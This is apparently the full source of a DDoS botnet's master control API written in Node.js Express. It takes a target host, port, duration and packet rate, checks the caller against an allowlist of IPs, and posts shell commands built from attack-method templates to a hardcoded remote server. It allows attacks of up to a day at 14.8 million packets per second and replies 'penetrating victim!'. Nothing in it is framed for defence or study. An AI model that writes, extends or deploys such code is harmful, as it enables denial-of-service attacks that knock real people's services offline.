const allowedIp = ["::ffff:188.212.135.166", "::ffff:209.141.31.125", "::ffff:211.195.218.9", "::ffff:196.240.57.181", "::ffff:176.123.9.134"];
const apiPort = 8080;
const found = false;

const express = require("express");
const request = require("got");
const methods = require("./methods");
const server = "193.177.182.7:8080";

const app = express();
app.get("/", (req, res) => 
{
  {
    let { host, port, time, method, pps} = req.query;
    port = Number(port);
    time = Number(time);
    pps = Number(pps);

    if (!time || typeof time !== "number") 
    {
      return res.send("Error: time is empty!");
    }
    
    if (!host) 
    {
      return res.send("Error: Host is empty!");
    }
    
    if (!method) 
    {
      return res.send("Error: Method is empty!");
    }
    
    if (typeof method !== "string") 
    {
      method = "stop";
    }
    
    if (!Object.keys(methods).includes(method)) 
    {
      return res.send("Error: The method you requested does not exist!");
    }
    
    if (port > 65535) 
    {
      return res.send("Error: Ports over 65535 do not exist");
    }
    
    if (time > 86400) 
    {
      return res.send("Error: Cannot exceed 86400 seconds!");
    }
        
    if (pps < 0 || pps > 14800000) 
    {
      return res.send("Error: Cannot exceed 14800000 Packets per second!");
    }

    const found = allowedIp.find(element => element == req.connection.remoteAddress);
      
    let shell = methods[method];
    shell = shell.replace("{http://alvet.ru}", host);
    shell = shell.replace("{80}", port);
    shell = shell.replace("{86400}", time);
    shell = shell.replace("{14800000}", pps);

    if (found) 
    {
      res.send("penetrating victim!");
      request.post("http://" + server, { json: { shell } });
      request.post("http://" + server, { json: { shell: `sleep ${time}; pkill ${host} -f` }});
    };
  }
});

process.on("unhandledRejection", () => {});

app.listen(apiPort, () => console.log(`Master started on port ${apiPort}`));
